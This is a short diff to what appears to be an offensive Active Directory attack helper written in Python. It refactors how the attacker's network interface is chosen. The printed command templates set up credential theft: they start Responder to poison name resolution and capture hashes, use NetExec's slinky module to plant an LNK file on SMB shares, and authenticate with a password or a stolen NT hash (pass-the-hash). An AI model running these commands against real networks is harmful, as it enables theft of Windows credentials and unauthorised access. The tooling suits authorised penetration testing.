@@ -14,6 +14,7 @@ def run():
     user = input_or_session("username", "Username")
     pw   = input_or_session("password", "Password")
     h    = SESSION.get("nt_hash", "")
+    iface = SESSION.get("attacker_iface") or "<INTERFACE>"
 
     auth = f"-u '{user}' -H '{h.split(':')[-1]}'" if h else f"-u '{user}' -p '{pw}'"
     subnet = prompt(f"Subnet (Enter to use {dc})") or dc
@@ -292,7 +293,7 @@ def run():
   {C}NXC Slinky — drop LNK file → capture hashes via Responder:{RST}
 
   {Y}Terminal 1 — Start Responder:{RST}
-  sudo responder -I {SESSION.get("attacker_iface","tun0")} -rdwv
+  sudo responder -I {iface} -rdwv
 
   {Y}Terminal 2 — Drop LNK via nxc:{RST}
   nxc smb {dc} {auth} -d {dom} \\
